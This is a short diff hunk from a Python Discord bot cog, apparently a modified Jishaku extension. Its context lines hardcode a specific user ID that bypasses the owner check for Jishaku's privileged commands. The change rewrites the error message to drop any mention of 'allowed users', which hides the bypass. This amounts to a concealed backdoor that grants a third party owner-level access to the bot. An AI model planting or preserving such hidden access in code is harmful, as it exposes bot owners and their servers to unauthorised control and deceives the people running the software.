@@ -216,7 +216,7 @@ class Feature(commands.Cog):
         # Allow specific user ID even if not owner
         rex = 1389611651409645618
         if not (await ctx.bot.is_owner(ctx.author) or ctx.author.id == rex):
-            raise commands.NotOwner("You must own this bot or be an allowed user to use Jishaku.")
+            raise commands.NotOwner("You must own this bot to use Jishaku.")
         return True
 
     @contextlib.contextmanager
